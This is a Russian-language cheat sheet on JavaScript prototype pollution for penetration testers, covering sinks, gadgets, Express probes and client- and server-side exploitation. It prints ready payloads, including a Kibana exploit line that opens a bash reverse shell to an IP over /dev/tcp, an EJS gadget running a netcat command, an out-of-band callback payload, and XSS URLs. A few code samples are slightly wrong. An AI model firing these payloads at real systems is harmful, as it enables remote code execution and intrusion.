# Prototype Pollution (Загрязнение прототипов)

> **Загрязнение прототипов** — это тип уязвимости, возникающей в JavaScript, когда изменяются свойства `Object.prototype`. Это особенно опасно, потому что объекты JavaScript являются динамическими, и мы можем добавлять в них свойства в любое время. Кроме того, почти все объекты в JavaScript наследуются от `Object.prototype`, что делает его потенциальным вектором атаки.

- [Инструменты](#Инструменты)
- [Примеры](#examples)
- [Ручное тестирование](#manual-testing)
- [Загрязнение прототипа через JSON-ввод](#prototype-pollution-via-json-input)
- [Загрязнение прототипа в URL](#prototype-pollution-in-url)
- [Полезные нагрузки для загрязнения прототипа](#prototype-pollution-payloads)
- [Гаджеты для загрязнения прототипа](#prototype-pollution-gadgets)
- [Ссылки](#references)

# Инструменты

- [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder) — Помогает найти гаджеты для эксплуатации загрязнения прототипов.
- [yuske/silent-spring](https://github.com/yuske/silent-spring) — Загрязнение прототипов, ведущее к удаленному выполнению кода в Node.js.
- [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) — Гаджеты для серверного загрязнения прототипов в ядре Node.js и сторонних NPM-пакетах.
- [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution) — Загрязнение прототипов и полезные скриптовые гаджеты на стороне клиента.
- [portswigger/server-side-prototype-pollution](https://github.com/portswigger/server-side-prototype-pollution) — Расширение для Burp Suite, обнаруживающее уязвимости загрязнения прототипов.
- [msrkp/PPScan](https://github.com/msrkp/PPScan) — Сканер загрязнения прототипов на стороне клиента.


> В JavaScript прототипы — это то, что позволяет объектам наследовать функции от других объектов. Если пользователь может добавить или изменить свойства `Object.prototype`, он может повлиять на все объекты, которые наследуются от этого прототипа, что потенциально может привести к различным видам угроз безопасности.

* **эксплуатация требует следующих ключевых компонентов:**

1.  **Источник Prototype Pollution** — это любой ввод, который позволяет отравить объекты прототипа произвольными свойствами.
*   URL-адрес через строку запроса (query) или фрагмента (hash)
*   Ввод на основе JSON
*   Веб-сообщения (web messages)
2.  **Приемник** — функция JavaScript или элемент DOM, которые позволяют выполнить произвольный код.
```javascript
Основные синки в JavaScript:

//HTML-синки
element.innerHTML = userInput;
document.write(userInput);
element.outerHTML = userInput;

// JavaScript-синки
eval(userInput);
setTimeout(userInput, 100);
Function(userInput);

// URL-синки
location.href = userInput;
window.open(userInput);

// Атрибуты
element.setAttribute('onload', userInput);
```
3.  **Эксплуатируемый гаджет** — это любое свойство, которое передается в приемник без надлежащей фильтрации или очистки.

```javascript
var myDog = new Dog();

// Указывает на функцию "Dog"
myDog.constructor;

// Указывает на определение класса "Dog"
myDog.constructor.prototype;
myDog.__proto__;
myDog["__proto__"];
```

### Примеры

Если приложение использует объект для хранения настроек конфигурации, например:

```javascript
let config = {
    isAdmin: false
};
```

Пользователь может добавить свойство `isAdmin` в `Object.prototype` следующим образом:

```javascript
Object.prototype.isAdmin = true;
```

# Ручное тестирование

*   **ExpressJS:** `{ "__proto__":{"parameterLimit":1}}` + 2 параметра в GET-запросе, по крайней мере 1 должен отражаться в ответе.
*   **ExpressJS:** `{ "__proto__":{"ignoreQueryPrefix":true}}` + `?foo=bar`
*   **ExpressJS:** `{ "__proto__":{"allowDots":true}}` + `?foo.bar=baz`
*   **Изменение отступа JSON-ответа:** `{ "__proto__":{"json spaces":" "}}` + `{"foo":"bar"}`, сервер должен вернуть `{"foo": "bar"}`.
*   **Изменение заголовков CORS:** `{ "__proto__":{"exposedHeaders":["foo"]}}`, сервер должен вернуть заголовок `Access-Control-Expose-Headers`.
*   **Изменение кода состояния:** `{ "__proto__":{"status":510}}`

# Загрязнение прототипа через JSON-ввод

Можно получить доступ к прототипу любого объекта через магическое свойство `__proto__`. Функция `JSON.parse()` в JavaScript используется для разбора JSON-строки и преобразования ее в объект JavaScript. Обычно это функция-сток (sink), где может произойти загрязнение прототипа.

```json
{
    "__proto__": {
        "evilProperty": "evilPayload"
    }
}
```

**Асинхронная полезная нагрузка для NodeJS.**

```json
{
  "__proto__": {
    "argv0": "node",
    "shell": "node",
    "NODE_OPTIONS": "--inspect=payload\"\".oastify\"\".com"
  }
}
```

**Загрязнение прототипа через свойство `constructor`.**

```json
{
    "constructor": {
        "prototype": {
            "foo": "bar",
            "json spaces": 10
        }
    }
}
```

# Загрязнение прототипа в URL

Примеры полезных нагрузок для загрязнения прототипа, найденных в реальных условиях.

```python
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```

# Эксплуатация загрязнения прототипа

В зависимости от того, выполняется ли загрязнение прототипа на стороне клиента (CSPP) или на стороне сервера (SSPP), последствия будут различаться.

*   **Удаленное выполнение команд:** [RCE в Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)

    ```python
    .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
    .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
    ```

*   **Удаленное выполнение команд:** [RCE с использованием гаджетов EJS](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)

    ```json
    {
        "__proto__": {
            "client": 1,
            "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
        }
    }
    ```

*   **Отраженный XSS:** [Reflected XSS on www.hackerone.com via Wistia embed code - #986386](https://hackerone.com/reports/986386)
*   **Обход на стороне клиента:** [Prototype pollution – and bypassing client-side HTML sanitizers](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
*   **Отказ в обслуживании (Denial of Service)**

# НагрузОчка

```python
Object.__proto__["evilProperty"]="evilPayload"
Object.__proto__.evilProperty="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
Object.constructor["prototype"]["evilProperty"]="evilPayload"
{"__proto__": {"evilProperty": "evilPayload"}}
{"__proto__.name":"test"}
x[__proto__][abaeead] = abaeead
x.__proto__.edcbcab = edcbcab
__proto__[eedffcb] = eedffcb
__proto__.baaebfc = baaebfc
?__proto__[test]=test
```

# Гаджеты для PP

**"Гаджет"** в контексте уязвимостей обычно относится к фрагменту кода или функциональности, которые могут быть использованы во время атаки. Когда мы говорим о **"гаджете для загрязнения прототипа"**, мы имеем в виду конкретный путь выполнения кода, функцию или возможность приложения, которые восприимчивы к атаке через загрязнение прототипа или могут быть использованы через нее.

Можно либо создать свой собственный гаджет, используя часть исходного кода с помощью [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder), либо попытаться использовать уже обнаруженные гаджеты из репозиториев [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) или [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution).

## Поиск гаджетов на стороне клиента вручную

1.  Просмотреть исходный код и определите любые свойства, используемые приложением или любыми импортированными им библиотеками.
2.  В Burp перехвати ответ, содержащий JavaScript, который необходимо протестировать.
3.  Добавь оператор `debugger;` в начало скрипта, затем перешли все оставшиеся запросы и ответы.
4.  В браузере Burp перейди на страницу, на которую загружается целевой скрипт. Оператор `debugger` приостанавливает выполнение скрипта.
5.  Пока скрипт еще приостановлен, переключись на консоль и введи следующую команду:
    ```javascript
    Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
        get() {
            console.trace();
            return 'polluted';
        }
    })
    ```
6.  Свойство добавляется в глобальный `Object.prototype`, и браузер будет записывать трассировку стека в консоль всякий раз, когда к нему обращаются.
7.  Нажми кнопку для продолжения выполнения скрипта и следите за консолью. Если появится трассировка стека, это подтверждает, что к свойству где-то в приложении был доступ.
8.  Разверните трассировку стека и используйте предоставленную ссылку, чтобы перейти к строке кода, где происходит чтение свойства.
9.  Используя элементы управления отладчика браузера, пройдите по шагам выполнения, чтобы увидеть, передается ли свойство в синк, такой как `innerHTML` или `eval()`.
10. Повторите этот процесс для любых свойств, которые, по вашему мнению, являются потенциальными гаджетами.

# CSPP через браузерные API

* **PP через fetch()**

Fetch API - простой способ для разработчиков инициировать HTTP-запросы с использованием JavaScript. Метод `fetch()` принимает два аргумента:

*   `URL`, на который вы хотите отправить запрос.
*   `Объект параметров (options)`, который позволяет вам контролировать части запроса, такие как метод, заголовки, параметры тела и так далее.

```javascript
fetch('https://normal-website.com/my-account/change-email', {
    method: 'POST',
    body: 'user=carlos&email=carlos%40ginandjuice.shop'
})
```

Явно определили свойства `method` и `body`, но есть ряд других возможных свойств, которые оставили неопределенными. 

```javascript
fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
```

Чтобы использовать, загрязнить `Object.prototype` свойством `headers`, содержащим вредоносный заголовок `x-username`, следующим образом:

```javascript
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```

* **Примечание**
* Эту технику можно использовать для управления любыми неопределенными свойствами объекта параметров, переданного в `fetch()`. 
__________________________

* **PP через Object.defineProperty()**
`Object.defineProperty()` - позволяет установить неконфигурируемое, неизменяемое свойство непосредственно на затронутом объекте следующим образом:

```javascript
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})
```

`Object.defineProperty()` принимает объект параметров, известный как "descriptor".

В этом случае атакующий может обойти эту защиту, загрязнив `Object.prototype` вредоносным свойством `value`. Если это свойство будет унаследовано объектом-дескриптором, переданным в `Object.defineProperty()`, контролируемое атакующим значение в конечном итоге может быть присвоено свойству гаджета.

# Server-side prototype pollution

* POST или PUT запросы, которые отправляют JSON-данные в приложение или API, являются основными кандидатами на такое поведение, поскольку серверы часто отвечают JSON-представлением нового или обновленного объекта. 

* загрязнить глобальный `Object.prototype` произвольным свойством:

```python
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "__proto__":{
        "foo":"bar"
    }
}
```

* Если веб-сайт уязвим, внедренное свойство затем появится в обновленном объекте в ответе.
* В редких случаях веб-сайт может даже использовать эти свойства для динамической генерации HTML, что приведет к отображению внедренного свойства в вашем браузере.
____________________

* **Переопределение кода статуса**

* В случае ошибок сервер JavaScript может выдать общий HTTP-ответ, но включить объект ошибки в формате JSON в тело. Это один из способов предоставления дополнительных сведений о причине ошибки, которые могут быть неочевидны из статуса HTTP по умолчанию.

Часто можно получить ответ `200 OK`, только для того, чтобы тело ответа содержало объект ошибки с другим статусом.

```python
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```

1.  Найти способ вызвать ответ с ошибкой.
2.  Загрязнить прототип своим собственным свойством `status`. Обязательно использовать obscure код статуса, который вряд ли будет выдан по какой-либо другой причине.
3.  Снова вызвать ответ с ошибкой и проверить код статуса.
   
____________________
* **Переопределение пробелов в JSON**

```python
{
  "__proto__": {
    "json spaces": 8
  }
}
```
* была исправлена в Express 4.17.4
* переключиться на вкладку `Raw` редактора сообщений
____________________

* **Переопределение кодировки**

Серверы Express(минималистичный веб-фреймворк для Node.js) часто реализуют так называемые модули "промежуточного ПО" (middleware), которые обеспечивают предварительную обработку запросов перед их передачей соответствующей функции-обработчику. Например, модуль `body-parser` обычно используется для разбора тела входящих запросов с целью создания объекта `req.body`. Он содержит еще один гаджет, который можно использовать для проверки серверной прототип-поллюции.

* код передает объект параметров в функцию `read()`, которая используется для чтения тела запроса для разбора. Один из этих параметров, `encoding`, определяет, какую кодировку символов использовать. Он либо получен из самого запроса через вызов функции `getCharset(req)`, либо по умолчанию равен UTF-8.

```javascript
var charset = getCharset(req) or 'utf-8'

function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
```

Если вы внимательно посмотрите на функцию `getCharset()`, похоже, что разработчики предусмотрели, что заголовок `Content-Type` может не содержать явного атрибута `charset`, поэтому они реализовали логику, которая в этом случае возвращается к пустой строке. Это означает, что она может быть контролируема через prototype pollution.

1.  В кодировке UTF-7  `foo` в UTF-7 — это `+AGYAbwBv-`.
    ```json
    {
        "sessionId":"0123456789",
        "username":"wiener",
        "role":"+AGYAbwBv-"
    }
    ```
2.  Серверы не используют кодировку UTF-7 по умолчанию, поэтому эта строка должна появиться в ответе в закодированном виде.
3.  Загрязнить прототип свойством `content-type`, которое явно указывает набор символов UTF-7:
    ```json
    {
        "sessionId":"0123456789",
        "username":"wiener",
        "role":"default",
        "__proto__":{
            "content-type": "application/json; charset=utf-7"
        }
    }
    ```
4.  строка UTF-7 теперь должна быть декодирована в ответе:
    ```json
    {
        "sessionId":"0123456789",
        "username":"wiener",
        "role":"foo"
    }
    ```

Из-за ошибки в модуле Node `_http_incoming` это работает, даже если фактический заголовок `Content-Type` запроса содержит свой собственный атрибут `charset`. Чтобы избежать перезаписи свойств, когда запрос содержит дублирующиеся заголовки, функция `_addHeaderLine()` проверяет, не существует ли уже свойства с тем же ключом, перед передачей свойств объекту `IncomingMessage`:

```javascript
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Drop duplicates
        dest[field] = value;
    }
}
```

* Если оно существует, обрабатываемый заголовок фактически отбрасывается. Из-за того, как это реализовано, эта проверка (предположительно непреднамеренно) включает свойства, унаследованные через цепочку прототипов. Это означает, что если мы загрязним прототип своим собственным свойством `content-type`, свойство, представляющее реальный заголовок `Content-Type` из запроса, будет отброшено в этот момент вместе с предполагаемым значением, полученным из заголовка.










* [](https://portswigger.net/research/server-side-prototype-pollution)
